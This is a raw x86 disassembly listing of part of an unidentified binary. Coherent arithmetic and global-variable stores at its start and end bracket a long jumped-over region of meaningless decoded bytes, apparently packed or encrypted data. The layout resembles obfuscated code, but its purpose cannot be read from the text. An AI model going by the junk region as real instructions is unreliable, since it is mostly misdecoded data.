  4073f1:	mov    DWORD PTR [ebp+0xc],eax
  4073f4:	mov    eax,ds:0x413c62
  4073f9:	mov    ecx,DWORD PTR [ebp+0xc]
  4073fc:	sub    eax,edi
  4073fe:	xor    eax,esi
  407400:	cmp    eax,ecx
  407402:	je     0x407449
  407408:	mov    eax,ds:0x413c5a
  40740d:	mov    ecx,DWORD PTR [ebp+0xc]
  407410:	sub    eax,edi
  407412:	xor    eax,esi
  407414:	cmp    eax,ecx
  407416:	jne    0x40742c
  40741c:	mov    eax,ds:0x413c62
  407421:	add    eax,DWORD PTR ds:0x413c5a
  407427:	jmp    0x407433
  40742c:	mov    eax,DWORD PTR [ebp+0xc]
  40742f:	xor    eax,esi
  407431:	add    eax,edi
  407433:	mov    ds:0x413c5a,eax
  407438:	mov    eax,DWORD PTR [ebp+0xc]
  40743b:	xor    eax,esi
  40743d:	add    eax,edi
  40743f:	mov    ds:0x413c62,eax
  407444:	jmp    0x407453
  407449:	mov    eax,ds:0x413c62
  40744e:	mov    ds:0x413c5a,eax
  407453:	mov    eax,DWORD PTR [ebp-0x24]
  407456:	mov    ecx,DWORD PTR ds:0x413c5a
  40745c:	add    DWORD PTR [eax],ecx
  40745e:	mov    eax,DWORD PTR [ebp-0xc]
  407461:	mov    eax,DWORD PTR [eax]
  407463:	pop    edi
  407464:	pop    esi
  407465:	pop    ebx
  407466:	leave  
  407467:	ret    0xc
  40746a:	push   ebp
  40746b:	mov    ebp,esp
  40746d:	push   ecx
  40746e:	push   ecx
  40746f:	mov    DWORD PTR ds:0x43376f,edi
  407475:	mov    eax,0x5a3fc98
  40747a:	movzx  ecx,WORD PTR ds:0x43372f
  407481:	mov    DWORD PTR [ebp-0x4],eax
  407484:	jmp    0x4077cf
  407489:	shl    DWORD PTR [edi],0x5f
  40748c:	sbb    DWORD PTR [ecx+0x61],ebx
  40748f:	inc    ecx
  407490:	out    0xc2,eax
  407492:	jle    0x40743d
  407494:	inc    ebx
  407495:	mov    DWORD PTR [eax+ebx*1],edi
  407498:	push   edx
  407499:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40749a:	sar    BYTE PTR [esi+0x7e],0x20
  40749e:	jge    0x40751e
  4074a0:	jle    0x407484
  4074a2:	jge    0x4074b8
  4074a4:	xchg   ebx,eax
  4074a5:	in     al,dx
  4074a6:	dec    esi
  4074a7:	adc    eax,0x6810a086
  4074ac:	aaa    
  4074ad:	imul   edx,DWORD PTR [esp+edx*4-0x3c68519e],0xffffffe8
  4074b5:	push   0xffffffb2
  4074b7:	jno    0x4074a8
  4074b9:	mov    DWORD PTR [ebx+0x7c5ad92a],esi
  4074bf:	cmp    DWORD PTR [edi+ecx*8],ebx
  4074c2:	xor    DWORD PTR [esi+eax*1],ebp
  4074c5:	xor    BYTE PTR [ecx],0x18
  4074c8:	dec    eax
  4074c9:	mov    al,ds:0x9a17eda0
  4074ce:	xchg   edi,eax
  4074cf:	cli    
  4074d0:	xlat   BYTE PTR ds:[ebx]
  4074d1:	imul   ebp,DWORD PTR [edi],0x4fa402f7
  4074d7:	popf   
  4074d8:	in     al,dx
  4074d9:	jmp    0x40749d
  4074db:	or     al,0x3f
  4074dd:	inc    ebx
  4074de:	mov    ah,0xc0
  4074e0:	iret   
  4074e1:	add    DWORD PTR [eax-0x49],0xa769b64
  4074e8:	adc    DWORD PTR cs:[ecx-0x67],ecx
  4074ec:	lods   eax,DWORD PTR ds:[esi]
  4074ed:	mov    ch,0xeb
  4074ef:	mov    eax,ds:0xbf2650e4
  4074f4:	jnp    0x4074c3
  4074f6:	xor    DWORD PTR [ecx],0xbe3649f0
  4074fc:	retf   
  4074fd:	mov    bh,0x32
  4074ff:	sbb    ch,dl
  407501:	stos   DWORD PTR es:[edi],eax
  407502:	int    0xd3
  407504:	ds iret 
  407506:	test   DWORD PTR [eax+0x2b66b32],esp
  40750c:	push   edx
  40750d:	clc    
  40750e:	mov    eax,0xa7b380ae
  407513:	test   BYTE PTR [ebx-0x26],0x31
  407517:	imul   esi,edi,0xffffff85
  40751a:	mov    eax,0x337a29bc
  40751f:	loope  0x407539
  407521:	gs add al,0x2e
  407524:	adc    ch,BYTE PTR [esi-0x465b5a86]
  40752a:	lahf   
  40752b:	push   eax
  40752c:	clc    
  40752d:	arpl   WORD PTR [esi],di
  40752f:	xchg   edx,eax
  407530:	mov    esp,0xdfbe9d7b
  407535:	inc    ecx
  407536:	dec    ecx
  407537:	add    DWORD PTR [esi],0xffffff90
  40753a:	pop    esi
  40753b:	inc    esp
  40753c:	push   cs
  40753d:	inc    edx
  40753e:	sub    al,0xce
  407540:	dec    edx
  407541:	cli    
  407542:	int3   
  407543:	rcr    BYTE PTR ds:0xf2ceae30,cl
  407549:	ret    0x1632
  40754c:	mov    esp,0x20e4a533
  407551:	xchg   DWORD PTR [esi],ebp
  407553:	aad    0x93
  407555:	push   0x2a
  407557:	sbb    dl,BYTE PTR [eax+0x7594895e]
  40755d:	dec    ebx
  40755e:	aas    
  40755f:	iret   
  407560:	mov    al,ds:0xea2cb148
  407565:	out    dx,al
  407566:	les    edx,FWORD PTR [esi-0x6f901d73]
  40756c:	jle    0x407528
  40756e:	cmp    eax,0x30d21d2a
  407573:	sbb    al,0x4c
  407575:	pop    edx
  407576:	repnz (bad)
  407579:	icebp  
  40757a:	pop    ds
  40757b:	ss mov ah,0xa
  40757e:	dec    edi
  407580:	das    
  407581:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407582:	lds    edi,FWORD PTR [eax]
  407584:	mov    gs,WORD PTR ds:0x7cc50de9
  40758a:	mov    bh,0x64
  40758c:	inc    edi
  40758d:	(bad)  
  40758f:	and    eax,esi
  407591:	mov    ebx,0xbe150757
  407596:	add    bh,dl
  407598:	clc    
  407599:	sbb    bl,BYTE PTR [ecx+0x16]
  40759c:	mov    dh,0xbb
  40759e:	test   al,0xeb
  4075a0:	dec    edi
  4075a1:	cwde   
  4075a2:	push   ss
  4075a3:	(bad)  
  4075a4:	mov    eax,ds:0xfcbfdb8a
  4075a9:	loop   0x407540
  4075ab:	imul   BYTE PTR [edx+edi*2-0x673b214a]
  4075b2:	stos   BYTE PTR es:[edi],al
  4075b3:	cwde   
  4075b4:	cmp    BYTE PTR [edx+0x7b],dh
  4075b7:	mov    DWORD PTR [edi],edi
  4075b9:	(bad)  
  4075ba:	mov    ds:0xf124b4e6,eax
  4075bf:	cmp    esi,0xd5e5da54
  4075c5:	inc    esp
  4075c6:	dec    ecx
  4075c7:	leave  
  4075c8:	dec    esp
  4075c9:	add    DWORD PTR [esi],esi
  4075cb:	push   eax
  4075cc:	fidiv  WORD PTR [ebp-0xe]
  4075cf:	cmp    esp,DWORD PTR [eax]
  4075d1:	out    dx,eax
  4075d2:	xchg   ebx,eax
  4075d3:	jo     0x40761b
  4075d5:	sahf   
  4075d6:	xlat   BYTE PTR ds:[ebx]
  4075d7:	inc    ebp
  4075d8:	xchg   DWORD PTR [edx-0x204f3f8e],esp
  4075de:	mov    ds:0x93fbad51,al
  4075e3:	in     eax,0x14
  4075e5:	scas   eax,DWORD PTR es:[edi]
  4075e6:	dec    edi
  4075e7:	jae    0x407635
  4075e9:	xor    DWORD PTR [edi],0xffffff95
  4075ec:	scas   eax,DWORD PTR es:[edi]
  4075ed:	out    0x75,eax
  4075ef:	call   0x97cfcd5e
  4075f4:	xchg   ecx,eax
  4075f5:	jmp    0x4075d0
  4075f7:	dec    ecx
  4075f8:	xchg   edi,eax
  4075f9:	cmp    DWORD PTR [ecx],ebp
  4075fb:	iret   
  4075fc:	inc    BYTE PTR ds:0x6fb82741
  407602:	mov    bl,0xb0
  407604:	pop    ebx
  407605:	call   0x8176b087
  40760a:	out    dx,al
  40760b:	adc    eax,0xc89bead3
  407610:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407611:	call   0xc69b:0xac4f2cd9
  407618:	pop    ss
  407619:	dec    ebp
  40761a:	xchg   edi,eax
  40761b:	jno    0x4075ae
  40761d:	cmp    WORD PTR ds:[eax],ax
  407621:	mov    ch,0x1a
  407623:	and    al,0x74
  407625:	popa   
  407626:	popf   
  407627:	fistp  WORD PTR [edx+0x697ce47]
  40762d:	jmp    0x407601
  40762f:	test   al,0x5f
  407631:	je     0x40763e
  407633:	sbb    BYTE PTR [ecx+0x70671217],bh
  407639:	clc    
  40763a:	mov    eax,ds:0x93034164
  40763f:	push   es
  407640:	popf   
  407641:	loope  0x40767a
  407643:	adc    edx,DWORD PTR [ebx]
  407645:	pop    ebx
  407646:	dec    ebx
  407647:	imul   ebx,esp,0x26
  40764a:	jecxz  0x40761a
  40764c:	add    eax,0x29049d81
  407651:	dec    ebp
  407652:	push   ebx
  407653:	dec    esi
  407654:	cwde   
  407655:	dec    esi
  407656:	inc    esp
  407657:	pusha  
  407658:	jle    0x40768f
  40765a:	retf   
  40765b:	shl    esp,cl
  40765d:	or     BYTE PTR [ebx-0x56],bl
  407660:	and    al,0xcc
  407662:	or     DWORD PTR ss:[edi-0x6bb37d3],edi
  407669:	js     0x407643
  40766b:	scas   eax,DWORD PTR es:[edi]
  40766c:	aaa    
  40766d:	inc    eax
  40766e:	jno    0x407612
  407670:	loope  0x4076d4
  407672:	push   0xfd1f6b79
  407677:	pusha  
  407678:	push   edi
  407679:	or     edx,DWORD PTR [eax+ecx*2]
  40767c:	mov    ecx,0xac97c430
  407681:	pop    esp
  407682:	jl     0x4076ca
  407684:	add    al,0x6
  407686:	(bad)  
  407687:	adc    al,0x82
  407689:	and    BYTE PTR [ebp-0x42f86b0c],ah
  40768f:	mov    al,ds:0xeffa51db
  407694:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407695:	or     dh,cl
  407697:	int3   
  407698:	adc    DWORD PTR [esi-0xc31eada],0x14
  40769f:	sub    al,0xa
  4076a1:	jg     0x4076d1
  4076a3:	fwait
  4076a4:	add    eax,ebp
  4076a6:	sub    al,0x3f
  4076a8:	dec    edx
  4076a9:	in     eax,dx
  4076aa:	jno    0x4076b5
  4076ac:	inc    eax
  4076ad:	dec    edx
  4076ae:	xlat   BYTE PTR ds:[ebx]
  4076af:	xor    ebx,ebx
  4076b1:	inc    ebp
  4076b2:	imul   eax,DWORD PTR [ebx-0x269d671f],0xffffff8f
  4076b9:	(bad)  
  4076ba:	adc    DWORD PTR [esi+0x72cec69d],eax
  4076c0:	ror    DWORD PTR [eax+ebx*2],cl
  4076c3:	xor    esp,DWORD PTR [ecx+0x58af9b1e]
  4076c9:	arpl   WORD PTR [edi+0x2f],ax
  4076cc:	pop    esp
  4076cd:	xchg   edx,eax
  4076ce:	push   edx
  4076cf:	dec    ecx
  4076d0:	jns    0x4076db
  4076d2:	dec    DWORD PTR [edx-0x66]
  4076d5:	jmp    0xc0a8:0x27b37ea4
  4076dc:	jo     0x40770c
  4076de:	(bad)  
  4076df:	in     al,0x4e
  4076e1:	nop
  4076e2:	imul   ecx,DWORD PTR [ebp+0x2ca369fc],0x66b101a8
  4076ec:	lahf   
  4076ed:	sub    BYTE PTR [eax-0x6586c036],0x98
  4076f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4076f5:	sub    dl,0x9e
  4076f8:	or     al,dl
  4076fa:	fld    TBYTE PTR ds:0x359e27c7
  407700:	(bad)  
  407701:	xlat   BYTE PTR ds:[ebx]
  407702:	xor    al,0x2d
  407704:	in     al,dx
  407705:	in     eax,0x76
  407707:	in     eax,0x9e
  407709:	push   esi
  40770a:	add    al,0x97
  40770c:	dec    eax
  40770d:	jne    0x4076af
  40770f:	add    eax,0x519c76c9
  407714:	cdq    
  407715:	es popf 
  407717:	inc    eax
  407718:	les    esi,FWORD PTR [ecx]
  40771a:	mov    cl,0x57
  40771c:	fcomp  QWORD PTR [ecx-0x71]
  40771f:	out    dx,eax
  407720:	cmp    eax,0xf6c0b82
  407725:	and    DWORD PTR [eax-0x42cd2cd8],esp
  40772b:	sub    eax,DWORD PTR ds:0x2b0cd4df
  407731:	push   esp
  407732:	xor    eax,esp
  407734:	sti    
  407735:	fisttp DWORD PTR [eax]
  407737:	in     al,dx
  407738:	(bad)  
  407739:	mov    ch,0xa6
  40773b:	adc    al,0x37
  40773d:	xchg   DWORD PTR [eax-0x1bf609f3],esp
  407743:	jg     0x4077a5
  407745:	xchg   edx,eax
  407746:	cdq    
  407747:	daa    
  407748:	jp     0x4076ef
  40774a:	or     al,0xae
  40774c:	cmp    BYTE PTR [ecx+ecx*1-0x5],ah
  407750:	sub    eax,DWORD PTR [ebp-0x74bba3fa]
  407756:	ss jmp 0x407713
  407759:	adc    al,BYTE PTR [edx-0x2151fae8]
  40775f:	fucomi st,st(3)
  407761:	iret   
  407762:	dec    ebp
  407763:	fnstcw WORD PTR [ebx]
  407765:	aaa    
  407766:	cli    
  407767:	loop   0x407797
  407769:	xor    DWORD PTR ds:0x17d3610b,eax
  40776f:	xlat   BYTE PTR ds:[ebx]
  407770:	add    edi,DWORD PTR [ebp+0x2ef7582c]
  407776:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407777:	push   ebx
  407778:	xchg   edi,eax
  407779:	push   ebp
  40777a:	mov    esi,0x78746306
  40777f:	icebp  
  407780:	pop    ecx
  407781:	push   ds
  407782:	jmp    0x45918bb6
  407787:	mov    esi,0x1ddad04e
  40778c:	jo     0x4077a6
  40778e:	mov    esp,0x602be2f5
  407793:	sbb    ah,BYTE PTR [esi+eax*8-0x6fe1ad6b]
  40779a:	mov    bh,0x23
  40779c:	xchg   DWORD PTR [edi-0x11],ecx
  40779f:	sbb    eax,0x11929e73
  4077a4:	inc    ebx
  4077a5:	repz push ebp
  4077a7:	dec    ebx
  4077a8:	and    esp,DWORD PTR [ebp+0x25]
  4077ab:	imul   edx,DWORD PTR [esi],0xb1a4ee8e
  4077b1:	int3   
  4077b2:	jmp    0x40779d
  4077b4:	mov    ss:0xb06b12a3,eax
  4077ba:	in     al,dx
  4077bb:	in     eax,dx
  4077bc:	outs   dx,DWORD PTR ds:[esi]
  4077bd:	adc    eax,0x144f37ba
  4077c2:	xor    al,0x25
  4077c4:	inc    ecx
  4077c5:	xor    DWORD PTR [edx],0x33
  4077c8:	cs dec edx
  4077ca:	xchg   BYTE PTR [edi-0x23],bh
  4077cd:	aaa    
  4077ce:	sub    cl,BYTE PTR [ebx+0x5c7fc4d]
  4077d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4077d5:	aaa    
  4077d6:	inc    ebx
  4077d7:	add    BYTE PTR [ebp+0x5e],ah
  4077da:	add    BYTE PTR [eax],al
  4077dc:	mov    DWORD PTR [ebp-0x8],0x4ec1
  4077e3:	jmp    0x407b2e
  4077e8:	out    dx,eax
  4077e9:	psubd  mm2,QWORD PTR [ecx+0x5a]
  4077ed:	push   ecx
  4077ee:	cmc    
  4077ef:	mov    cl,0x14
  4077f1:	loop   0x40786d
  4077f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4077f4:	dec    eax
  4077f5:	(bad)  
  4077f6:	mov    al,ds:0x7ecf5697
  4077fb:	jle    0x40781d
  4077fd:	jge    0x40787d
  4077ff:	jle    0x407784
  407801:	jmp    0x4077d5
  407803:	and    eax,0xc93608e1
  407808:	(bad)  
  40780a:	stos   DWORD PTR es:[edi],eax
  40780b:	mov    esp,0x774acbd6
  407810:	push   ebp
  407811:	pushf  
  407812:	es xchg ecx,eax
  407814:	xchg   edx,eax
  407815:	or     esi,ebx
  407817:	int    0xe7
  407819:	push   0x2ce0d057
  40781e:	adc    eax,0x9478202a
  407823:	jmp    0xf0b6:0xd5a450dc
  40782a:	jmp    0x40781f
  40782c:	mov    edi,0xeb47f302
  407831:	jp     0x40785f
  407833:	jne    0x4078b1
  407835:	dec    esi
  407836:	gs xchg ecx,eax
  407838:	ins    BYTE PTR es:[edi],dx
  407839:	pop    edi
  40783a:	pop    edi
  40783b:	or     ebx,DWORD PTR [edi]
  40783d:	mov    esi,0xefac86e5
  407842:	outs   dx,BYTE PTR ds:[esi]
  407843:	in     eax,dx
  407844:	cmp    eax,0x6ba5df4f
  407849:	in     eax,dx
  40784a:	or     BYTE PTR [eax],dh
  40784c:	shl    edi,0xbc
  40784f:	push   ecx
  407850:	or     DWORD PTR [edi+0x1d],esi
  407853:	stos   DWORD PTR es:[edi],eax
  407854:	push   ss
  407855:	ret    0x7486
  407858:	jmp    0x52fdb03
  40785d:	cmp    BYTE PTR [edx+0x21],al
  407860:	les    esi,FWORD PTR [ecx]
  407862:	das    
  407863:	rcl    DWORD PTR [ebx+0x330469a],cl
  407869:	repnz rol BYTE PTR [esi+ebp*1],1
  40786d:	jle    0x4078e8
  40786f:	mov    cl,0xf
  407871:	xlat   BYTE PTR ds:[ebx]
  407872:	pop    esi
  407873:	push   ss
  407874:	sub    eax,0xc1e3e699
  407879:	in     eax,dx
  40787a:	xchg   BYTE PTR [esi],dl
  40787c:	cmp    eax,0x19ac1f69
  407881:	jg     0x40786b
  407883:	sub    eax,0x68a23e59
  407888:	test   al,0x18
  40788a:	or     ebx,DWORD PTR [edi+eiz*8+0x1f]
  40788e:	xchg   edi,eax
  40788f:	pusha  
  407890:	inc    ecx
  407891:	or     DWORD PTR [esi+0x70],eax
  407894:	cmp    eax,0x23c75db7
  407899:	mov    bl,0x5e
  40789b:	in     eax,dx
  40789c:	xor    al,BYTE PTR gs:[edx-0x2f5cd031]
  4078a3:	fwait
  4078a4:	ret    
  4078a5:	cmc    
  4078a6:	fs aam 0x81
  4078a9:	jg     0x4078f1
  4078ab:	cld    
  4078ac:	push   0xffffffb2
  4078ae:	sbb    eax,0xc8ef8b0a
  4078b3:	ins    DWORD PTR es:[edi],dx
  4078b4:	in     al,0xf8
  4078b6:	(bad)  
  4078b7:	push   ebx
  4078b8:	and    bh,BYTE PTR [edx-0x829086]
  4078be:	cmp    al,0xf5
  4078c0:	mov    bl,0x66
  4078c2:	dec    edx
  4078c3:	out    dx,eax
  4078c4:	push   esp
  4078c5:	leave  
  4078c6:	adc    dh,BYTE PTR [ecx]
  4078c8:	pop    ebx
  4078c9:	lods   eax,DWORD PTR ds:[esi]
  4078ca:	pop    ecx
  4078cb:	sti    
  4078cc:	jbe    0x407914
  4078ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4078cf:	das    
  4078d0:	loop   0x4078ed
  4078d2:	mov    ch,0x21
  4078d4:	dec    eax
  4078d5:	repnz (bad) 
  4078d7:	push   eax
  4078d8:	aad    0x57
  4078da:	scas   eax,DWORD PTR es:[edi]
  4078db:	ins    DWORD PTR es:[edi],dx
  4078dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4078dd:	mov    al,ds:0x8587f78c
  4078e2:	ret    0x2ae4
  4078e5:	pusha  
  4078e6:	sub    DWORD PTR [ebp-0x7cece3c2],ecx
  4078ec:	mov    edi,0x7a503c78
  4078f1:	xchg   esp,eax
  4078f2:	inc    eax
  4078f3:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  4078f5:	jns    0x4078df
  4078f7:	dec    eax
  4078f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4078f9:	jmp    0x40793f
  4078fb:	rol    BYTE PTR [ecx-0x508ed762],0x4a
  407902:	fimul  DWORD PTR [eax]
  407904:	jns    0x4078ac
  407906:	dec    esi
  407907:	daa    
  407908:	inc    ecx
  407909:	xchg   ebx,eax
  40790a:	rol    dh,cl
  40790c:	sub    DWORD PTR [esi],edi
  40790e:	ds dec edi
  407910:	stos   DWORD PTR es:[edi],eax
  407911:	je     0x4078d7
  407913:	pop    eax
  407914:	xchg   ecx,eax
  407915:	pop    edi
  407916:	cmp    BYTE PTR [esi],dl
  407918:	hlt    
  407919:	fnstcw WORD PTR [eax-0x2b]
  40791c:	xor    al,0xd
  40791e:	lods   al,BYTE PTR ds:[esi]
  40791f:	aas    
  407920:	fist   WORD PTR [ebp+0x41145a99]
  407926:	ins    DWORD PTR es:[edi],dx
  407927:	ss sub eax,0x49176640
  40792d:	pop    edi
  40792e:	in     al,0x2f
  407930:	ss cmp al,0xb2
  407933:	mov    ah,0x1f
  407935:	mov    ebx,0xa72e7480
  40793a:	sub    eax,0x7688617a
  40793f:	iret   
  407940:	or     al,0x67
  407942:	out    dx,al
  407943:	jmp    0x277d:0x1044e46a
  40794a:	dec    edx
  40794b:	je     0x4078e4
  40794d:	daa    
  40794e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40794f:	(bad)  
  407950:	lds    esi,FWORD PTR [ecx]
  407952:	inc    ecx
  407953:	fld    QWORD PTR [edi-0x31]
  407956:	xlat   BYTE PTR ds:[ebx]
  407957:	les    edx,FWORD PTR [edi+eiz*4-0x5133b259]
  40795e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40795f:	call   0x183b02e5
  407964:	mov    ah,0xba
  407966:	ss pop eax
  407968:	adc    eax,0xbbb0893d
  40796e:	leave  
  40796f:	in     al,dx
  407970:	cmp    ebx,DWORD PTR [edx+0x13]
  407973:	push   ecx
  407974:	xor    BYTE PTR es:[ebx+0x52],ch
  407978:	xchg   ebp,eax
  407979:	inc    esi
  40797a:	inc    eax
  40797b:	sbb    esi,ecx
  40797d:	push   ecx
  40797e:	cmp    DWORD PTR [ebx],edx
  407980:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407981:	arpl   WORD PTR [eax],bp
  407983:	sahf   
  407984:	arpl   di,ax
  407986:	xor    BYTE PTR [edi-0x2377ae06],dl
  40798c:	gs mov dh,0x2c
  40798f:	cmp    ebp,esi
  407991:	out    0x24,eax
  407993:	lds    ebp,FWORD PTR [ebp-0x3fab3f12]
  407999:	cdq    
  40799a:	pop    ss
  40799b:	pop    ds
  40799c:	sub    BYTE PTR [ecx+0x5243ca1],bh
  4079a2:	xchg   ebp,eax
  4079a3:	loopne 0x4079a7
  4079a5:	mov    esi,0x203d1052
  4079aa:	add    dl,al
  4079ac:	push   cs
  4079ad:	dec    esi
  4079ae:	jmp    0xd0d9:0xf92ffb41
  4079b5:	and    al,0x7
  4079b7:	inc    eax
  4079b8:	neg    BYTE PTR [ecx-0x5f4cd7bc]
  4079be:	xchg   esp,eax
  4079bf:	scas   al,BYTE PTR es:[edi]
  4079c0:	or     DWORD PTR cs:[ecx],0xa999fb93
  4079c7:	sbb    dh,BYTE PTR [esi+0x1e42b013]
  4079cd:	call   0x723b:0x4daffc74
  4079d4:	repz test esp,esp
  4079d7:	scas   al,BYTE PTR es:[edi]
  4079d8:	mov    ds:0x6d5c9c8b,al
  4079dd:	mov    eax,0xb597d784
  4079e2:	mov    eax,ds:0x4697689f
  4079e8:	not    BYTE PTR [eax+0x752af7bc]
  4079ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4079ef:	loopne 0x407a44
  4079f1:	mov    edx,0x3a4eb0e8
  4079f6:	lods   al,BYTE PTR ds:[esi]
  4079f7:	test   DWORD PTR [eax+0x3b],ebp
  4079fa:	retf   0xfa9c
  4079fd:	and    eax,0x9e9967ee
  407a02:	(bad)  
  407a03:	push   esp
  407a04:	add    BYTE PTR [ebp*2+0x624363a3],ah
  407a0b:	mov    al,0xd0
  407a0d:	pop    ds
  407a0e:	nop
  407a0f:	addr16 inc edi
  407a11:	sub    ch,ch
  407a13:	adc    dl,BYTE PTR [esi-0x6990fce9]
  407a19:	add    DWORD PTR ds:0xa7a5b36c,edx
  407a1f:	in     al,dx
  407a20:	ds jp  0x407a5a
  407a23:	test   DWORD PTR [ecx-0x343128c3],ebp
  407a29:	jge    0x407a9a
  407a2b:	cmp    dh,0x33
  407a2e:	retf   0xe54d
  407a31:	shl    BYTE PTR [ecx-0x1c],1
  407a34:	adc    bl,ch
  407a36:	fbstp  TBYTE PTR [esp+ecx*8+0x54]
  407a3a:	iret   
  407a3b:	xor    esp,0x3e
  407a3e:	fcmove st,st(3)
  407a40:	clc    
  407a41:	int    0xe5
  407a43:	pusha  
  407a44:	icebp  
  407a45:	aaa    
  407a46:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407a47:	popf   
  407a48:	inc    ebp
  407a49:	mov    ebx,0xd1137a06
  407a4e:	lea    eax,[edi+0x8]
  407a51:	jp     0x4079fc
  407a53:	cld    
  407a54:	ins    DWORD PTR es:[edi],dx
  407a55:	dec    bh
  407a57:	push   0x1ec63adb
  407a5c:	nop
  407a5d:	pop    eax
  407a5e:	sbb    ebp,ebp
  407a60:	sti    
  407a61:	mov    ebp,0x86459191
  407a66:	aaa    
  407a67:	jmp    0x407a06
  407a69:	dec    edi
  407a6a:	dec    eax
  407a6b:	pop    ebx
  407a6c:	push   es
  407a6d:	sbb    al,BYTE PTR [eax+0x3c]
  407a70:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407a71:	sbb    DWORD PTR [ecx+edi*4],eax
  407a74:	fwait
  407a75:	jae    0x407a7b
  407a77:	leave  
  407a78:	sbb    DWORD PTR [eax-0x2a],0x20
  407a7c:	imul   esp,edi,0x67
  407a7f:	ds popa 
  407a81:	sub    DWORD PTR [edi],edi
  407a83:	add    al,0xeb
  407a85:	mov    eax,DWORD PTR [esi]
  407a87:	jecxz  0x407a89
  407a89:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407a8a:	cwd    
  407a8c:	pushf  
  407a8d:	mov    eax,0x80ace1eb
  407a92:	dec    eax
  407a93:	cmp    BYTE PTR [eax],ch
  407a95:	in     al,dx
  407a96:	sub    BYTE PTR [ebx],ah
  407a98:	mov    ebx,0x5123e34b
  407a9d:	aas    
  407a9e:	push   cs
  407a9f:	ja     0x407a33
  407aa1:	pop    ebp
  407aa2:	pusha  
  407aa3:	inc    dh
  407aa5:	adc    eax,0x1696aa74
  407aaa:	xor    al,0x7b
  407aac:	or     eax,0x7cd37e2a
  407ab1:	cld    
  407ab2:	fidiv  WORD PTR [ebx+eiz*2]
  407ab5:	jno    0x407b19
  407ab7:	inc    esi
  407ab8:	fdivr  DWORD PTR [ecx+ecx*2]
  407abb:	data16 test al,0xf8
  407abe:	lods   eax,DWORD PTR ds:[esi]
  407abf:	dec    edx
  407ac0:	std    
  407ac1:	(bad)  
  407ac2:	in     eax,dx
  407ac3:	clc    
  407ac4:	mov    di,0x54bd
  407ac8:	inc    edx
  407ac9:	dec    ebp
  407aca:	jbe    0x407ad3
  407acc:	jl     0x407b30
  407ace:	mov    esi,0xc8931577
  407ad3:	mov    esp,esp
  407ad5:	retf   0x7f2f
  407ad8:	inc    eax
  407ad9:	das    
  407ada:	lods   al,BYTE PTR ds:[esi]
  407adb:	sbb    BYTE PTR [esi+0x300b4316],dl
  407ae1:	std    
  407ae2:	dec    esp
  407ae3:	cmovo  ebx,DWORD PTR [edx+edi*1+0x2c]
  407ae8:	scas   al,BYTE PTR es:[edi]
  407ae9:	xchg   edx,eax
  407aea:	cmp    ecx,DWORD PTR [ecx]
  407aec:	jg     0x407a8f
  407aee:	sub    eax,0x78f9d147
  407af3:	mov    ds:0x62527f3c,al
  407af8:	jg     0x407ab6
  407afa:	loop   0x407af1
  407afc:	xchg   edx,eax
  407afd:	aas    
  407afe:	loopne 0x407b01
  407b00:	push   esp
  407b01:	sbb    BYTE PTR [edx],0x3a
  407b04:	mov    ch,0x86
  407b06:	sub    ecx,DWORD PTR [ecx]
  407b08:	push   edi
  407b09:	xchg   ebp,eax
  407b0a:	push   ebp
  407b0b:	push   ds
  407b0c:	adc    DWORD PTR [eax],edi
  407b0e:	add    dh,BYTE PTR [edx-0x45c4bebc]
  407b14:	jae    0x407aeb
  407b16:	mov    esi,0xc537daf6
  407b1b:	fisub  DWORD PTR [esp+edi*8]
  407b1e:	dec    ecx
  407b1f:	inc    esp
  407b20:	mov    BYTE PTR [esi-0x33],bl
  407b23:	fdiv   QWORD PTR [eax-0xa]
  407b26:	push   0x2ac24320
  407b2b:	inc    eax
  407b2c:	(bad)  
  407b2d:	js     0x407b6a
  407b2f:	enter  0x850f,0xc6
  407b33:	add    eax,DWORD PTR [eax]
  407b35:	add    BYTE PTR [esi-0x75],ah
  407b38:	inc    ebp
  407b39:	clc    
  407b3a:	xor    ecx,0x551
  407b40:	mov    ecx,0x8a3c
  407b45:	sub    DWORD PTR ds:0x433723,0x433767
  407b4f:	xor    ax,cx
  407b52:	mov    ecx,0x3b02
  407b57:	sub    DWORD PTR ds:0x433803,0x1193
  407b61:	add    ax,cx
  407b64:	mov    ecx,DWORD PTR [ebp+0x8]
  407b67:	movzx  eax,ax
  407b6a:	and    DWORD PTR ds:0x43372b,0x433827
  407b74:	not    eax
  407b76:	and    eax,DWORD PTR [ecx]
  407b78:	mov    DWORD PTR ds:0x43383b,0x844
  407b82:	mov    ecx,DWORD PTR [ebp+0x8]
  407b85:	mov    DWORD PTR ds:0x4337fb,0x1c5f
  407b8f:	mov    DWORD PTR [ecx],eax
  407b91:	jmp    0x407ee8
  407b96:	jmp    0x407ee1
  407b9b:	dec    eax
  407b9c:	sbb    dh,BYTE PTR [ebx-0x16]
  407b9f:	jno    0x407c14
  407ba1:	push   ecx
  407ba2:	cwde   
  407ba3:	mov    ds:0x9af6a3a4,al
  407ba8:	frstor [esi]
  407baa:	mov    eax,ds:0x7e7ecb78
  407baf:	and    BYTE PTR [ebp+0x7e],bh
  407bb2:	jle    0x407b57
  407bb4:	push   ds
  407bb5:	test   dl,al
  407bb7:	pop    esi
  407bb8:	adc    bh,dl
  407bba:	lock test al,bl
  407bbd:	and    BYTE PTR [edi],0xcf
  407bc0:	xchg   BYTE PTR [edi],bl
  407bc2:	pop    DWORD PTR [ebx-0x78fe0c80]
  407bc8:	ja     0x407b83
  407bca:	add    DWORD PTR [esi-0x28],esi
